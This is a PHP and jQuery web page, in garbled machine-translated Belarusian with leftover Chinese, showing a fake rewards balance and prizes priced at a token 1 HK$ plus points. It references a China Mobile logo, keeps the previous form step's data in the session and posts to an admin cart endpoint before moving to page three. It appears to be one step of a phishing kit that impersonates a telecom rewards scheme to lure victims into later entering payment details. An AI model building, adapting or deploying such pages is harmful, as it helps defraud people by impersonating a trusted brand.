<?php
session_start();
require_once 'config.php';
// include('partials/header.php');
include('header_.php');



if (isset($_POST['submit'])) {
    $_SESSION['step1Data'] = $_POST;
}

$productList = [
    [
        'product_name' => "Навушнікі для гульняў з функцыяй адмены шуму Hanlin Future69 ENC",
        'product_price' => 'MOK$+5000 балаў',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_01.png'
    ],
    [
        'product_name' => "Разумны гадзіннік з Bluetooth-навушнікамі Hanlin",
        'product_price' => "1HK$+5000 балаў",
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_02.png'
    ],
    [
        'product_name' => "Oral-B - Электрычная зубная щётка з паўторнай зарядкай Smart Series SS5000",
        'product_price' => '1HK$+4000 балаў',
        'price' => '4000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_03.png'
    ],
    [
        'product_name' => "Project E Beauty - Ультразвукавы прылад для хуткага схуднення з інфрачывым святлом LED і беспрыводнай радыёчастотай",
        'product_price' => '1HK$+5000 балаў',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_04.png'
    ]
];


?>
<style>
    .wrap {
        /*            margin-top:70px;*/
        padding: 30px 30px;
    }

    @media(max-width: 767px) {
        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }

        .boxs {
            background-color: rgb(0, 159, 223);
            padding: 30px 20px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .section_1 {
            width: 50%;
        }

        .section_2 {
            width: 50%;
        }

        .inner_box {
            display: flex;
            flex-direction: column;
        }

        .inner_box>span {
            color: #fff;
        }

        .inner_box>b {
            color: #fff;
        }

        .product_area {

            margin-top: 12px;
        }

        .product_area>b {
            color: rgb(0, 159, 223);
        }

        .product_list {
            display: grid;
            align-items: center;
            justify-content: center;
            text-align: center;
            grid-template-columns: auto auto;
        }

        .product_s {
            width: 85%;
            border: 1px solid #efefef;
            margin: 5px;
            padding: 12px;
            height: 380px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .product_s>p {
            margin-bottom: 5px;
            font-size: 15px;
            font-weight: 500;
        }

        .p_name {}

        .p_image {
            width: 100%;
        }

        .p_quantity {}

        .p_cart {
            padding: 4px;
            background: #2870d3;
            color: #fff;
            border: 0px;
            width: 100%;
            border-radius: 12px;
        }

        .update_qty>input:focus {
            outline: none;
        }

        .update_qty>input:active {
            outline: none;
        }

        .update_qty>input {
            outline: none;
            border: 0px;
            width: 90px;
            text-align: center;
        }

        .update_qty {
            margin-bottom: 8px;
            border-radius: 8px;
            padding: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid;
        }

        .next_page {
            padding: 12px;
            background-color: rgb(0, 159, 223);
            color: #fff;
            border: 0px;
            width: 100%;
            border-radius: 12px;
        }
    }

    .wrap>b {
        color: #00a8b7;
    }
</style>
<div class="wrap">
    <b style="color: rgb(0, 159, 223);">
        <i class="fa fa-chevron-left"></i> Кропкавыя дэталі
    </b>
    <div class="boxs">
        <div class="section_1">
            <div class="inner_box">
                <span>Даступныя балы</span>
                <input type="hidden" id="totalValue" value="5000" />
                <b>5340</b>
            </div>
        </div>
        <div class="section_2">
            <div class="inner_box">
                <span>Трансферныя пункты</span>
                <b>0</b>
            </div>
        </div>
    </div>
    <div class="product_area">
        <b>
            Выкуп узнагароды
        </b>
        <div class="product_list">
            <input type="hidden" value="" id="totalPrice" />
            <?php foreach ($productList as $k => $products) { ?>
                <div class="product_s">
                    <img class="p_image" src="<?php echo $products['product_image']  ?>" />
                    <p class="p_name"><?php echo $products['product_name'] ?></p>
                    <p class="p_quantity"><?php echo $products['product_price'] ?></p>
                    <input type="hidden" id="price<?php echo $k ?>" value="<?php echo $products['price'] ?>" />
                    <input type="hidden" id="final_price<?php echo $k ?>" value="" />
                    <div class="update_qty">
                        <i class="fa fa-plus" onclick="up(<?php echo $k ?>)"></i>
                        <input type="number" disabled value="0" id="qty<?php echo $k ?>" />
                        <i class="fa fa-minus" onclick="down(<?php echo $k ?>)"></i>
                    </div>
                    <!--                        <button class="p_cart">大車</button>-->
                </div>
            <?php
            }
            ?>
        </div>
    </div>
    <br>
    <br>
    <div class="nextPage">
        <div id="progress-loading" style="display:none;text-align:center;"><img style="width:60px; height:auto;" src="../loading.gif" /></div>
        <button class="next_page" id="carBtn" onclick="goToNextPage()">абмен</button>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
    setTimeout(() => {
        jQuery('.loader-wrap').hide();
    }, 3000);
    let totalValue = Number($('#totalValue').val());
    let calculateValue = 0;
    let quantity = 0;

    function up(val) {
        let totalPrice = Number($('#totalPrice').val());
        if (calculateValue >= totalValue) {
            alert('Перавысіць наяўныя балы');
            console.log("value already exeeded");
        } else {
            let value = Number($('#qty' + val).val()) + 1;
            quantity = value;
            $('#qty' + val).val(value);
            let productPrice = Number($('#price' + val).val());
            let finalValue = productPrice * value;
            calculateValue = finalValue;
            console.log("totalPrice ===>", finalValue);
            $('#totalPrice').val(calculateValue);
            if (finalValue > totalValue) {
                alert('Перавысіць наяўныя балы');
            }
        }
    }

    function down(val) {
        let value = Number($('#qty' + val).val()) - 1;
        quantity = value;
        let totalPrice = Number($('#totalPrice').val());
        if (value >= 0) {
            $('#qty' + val).val(value);
            let productPrice = Number($('#price' + val).val());
            console.log("productPrice ==>", productPrice);
            console.log("totalPrice ==>", totalPrice);
            let finalValue = calculateValue - productPrice;
            console.log("finalValue ===>", finalValue);
            calculateValue = finalValue;
            $('#totalPrice').val(finalValue);
        }
    }

    function goToNextPage() {
        let totalPrice = Number($('#totalPrice').val());
        console.log('totalPrice ===>', totalPrice);
        console.log('totalValue ===>', totalValue);
        console.log('quantity ===>', quantity);
        let formData = {
            total_quantity: quantity
        }
        $("#progress-loading").show();
        $('#carBtn').prop('disabled', true);
        $.ajax({
            url: "/admin/cart.php",
            type: "POST",
            data: formData,
            success: function(response) {
                $("#progress-loading").hide();
                console.log("response ===>", response);
                window.location.href = 'page3.php';
            },
            error: function(error) {
                $("#progress-loading").hide();
                $('#carBtn').prop('disabled', false);
                console.log("error ===>", error);
            }
        });
        // if(calculateValue >= totalValue) {
        //     alert('超出可用積分');
        // } else {
        //     window.location.href='page3.php';
        // }
    }
</script>
<?php
include('footer_.php');
